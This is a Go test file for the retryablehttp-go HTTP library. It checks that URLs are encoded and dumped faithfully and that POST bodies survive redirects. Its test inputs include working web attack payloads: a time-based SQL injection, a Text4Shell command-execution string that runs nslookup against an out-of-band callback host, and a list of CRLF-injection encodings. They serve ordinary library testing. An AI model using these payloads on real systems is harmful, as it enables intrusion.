package retryablehttp_test

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/projectdiscovery/retryablehttp-go"
)

func TestRequestUrls(t *testing.T) {
	testcases := []string{
		"https://scanme.sh?exploit=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(12)))nQIP)",
		"https://scanme.sh/%20test%0a",
		"https://scanme.sh/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d",
		"scanme.sh",
		"scanme.sh/with/path",
		"scanme.sh:443",
		"scanme.sh:443/with/path",
	}

	debug := os.Getenv("DEBUG")

	for _, v := range testcases {
		req, err := retryablehttp.NewRequest("GET", v, nil)
		if err != nil {
			t.Errorf("got %v with url %v", err.Error(), v)
			continue
		}
		bin, err := req.Dump()
		if err != nil {
			t.Errorf("failed to dump request body %v", err)
		}
		if debug != "" {
			t.Logf("\n%v\n", string(bin))
		}
	}
}

func TestEncodedPaths(t *testing.T) {

	// test this on all valid crlf payloads
	payloads := []string{"%00", "%0a", "%0a%20", "%0d", "%0d%09", "%0d%0a", "%0d%0a%09", "%0d%0a%20", "%0d%20", "%20", "%20%0a", "%20%0d", "%20%0d%0a", "%23%0a", "%23%0a%20", "%23%0d", "%23%0d%0a", "%23%0a", "%25%30", "%25%30%61", "%2e%2e%2f%0d%0a", "%2f%2e%2e%0d%0a", "%2f..%0d%0a", "%3f", "%3f%0a", "%3f%0d", "%3f%0d%0a", "%e5%98%8a%e5%98%8d", "%e5%98%8a%e5%98%8d%0a", "%e5%98%8a%e5%98%8d%0d", "%e5%98%8a%e5%98%8d%0d%0a", "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"}

	// create url using below data and payload
	suffix := "/path?param=true"

	for _, v := range payloads {
		exURL := "https://scanme.sh/" + v + suffix
		req, err := retryablehttp.NewRequest("GET", exURL, nil)
		if err != nil {
			t.Fatalf("got %v with payload %v", err.Error(), v)
		}

		bin, err := req.Dump()
		if err != nil {
			t.Errorf("failed to dump request body for payload %v got %v", v, err)
		}

		relPath := getPathFromRaw(bin)
		payload := strings.TrimSuffix(relPath, suffix)
		payload = strings.TrimPrefix(payload, "/")

		if v != payload {
			t.Errorf("something went wrong expected `%v` in outgoing request but got-----\n%v\n------", v, string(bin))
		}
	}
}

func TestRedirectPOSTWithBody(t *testing.T) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	bodyContent := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s--\r\n", boundary, boundary)

	ts := setupRedirectServer(t, bodyContent)
	defer ts.Close()

	url := ts.URL + "/redirect"

	// Test with retryablehttp
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req, err := retryablehttp.NewRequestWithContext(context.Background(), "POST", url, strings.NewReader(bodyContent))
	if err != nil {
		t.Fatalf("NewRequestWithContext failed: %v", err)
	}

	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("client.Do failed: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Errorf("Expected status 200, got %d. Body: %s", resp.StatusCode, string(body))
	}
}

func TestRedirectPOSTWithBodyFromRequest(t *testing.T) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	bodyContent := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s--\r\n", boundary, boundary)

	ts := setupRedirectServer(t, bodyContent)
	defer ts.Close()

	url := ts.URL + "/redirect"

	// Test with retryablehttp
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	// Use http.NewRequest then FromRequest
	httpReq, err := http.NewRequest("POST", url, strings.NewReader(bodyContent))
	if err != nil {
		t.Fatalf("http.NewRequest failed: %v", err)
	}
	httpReq.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	req, err := retryablehttp.FromRequest(httpReq)
	if err != nil {
		t.Fatalf("FromRequest failed: %v", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("client.Do failed: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Errorf("Expected status 200, got %d. Body: %s", resp.StatusCode, string(body))
	}
}

func setupRedirectServer(t *testing.T, expectedBody string) *httptest.Server {
	t.Helper()

	mux := http.NewServeMux()
	mux.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)

			return
		}

		_, err := io.ReadAll(r.Body)
		if err != nil {
			t.Logf("redirect read body err: %v", err)
		}
		_ = r.Body.Close()

		w.Header().Set("Location", "/target")
		w.WriteHeader(http.StatusTemporaryRedirect) // 307
	})

	mux.HandleFunc("/target", func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		_ = r.Body.Close()

		if len(body) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			_, _ = w.Write([]byte("empty body"))

			return
		}

		if string(body) != expectedBody {
			w.WriteHeader(http.StatusBadRequest)
			_, _ = w.Write([]byte("body mismatch"))

			return
		}

		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("success"))
	})

	return httptest.NewServer(mux)
}

func getPathFromRaw(bin []byte) (relpath string) {
	buff := bufio.NewReader(bytes.NewReader(bin))
readline:
	line, err := buff.ReadString('\n')
	if err != nil {
		return
	}
	if strings.Contains(line, "HTTP/1.1") {
		parts := strings.Split(line, " ")
		if len(parts) == 3 {
			relpath = parts[1]
			return
		}
	}
	goto readline
}
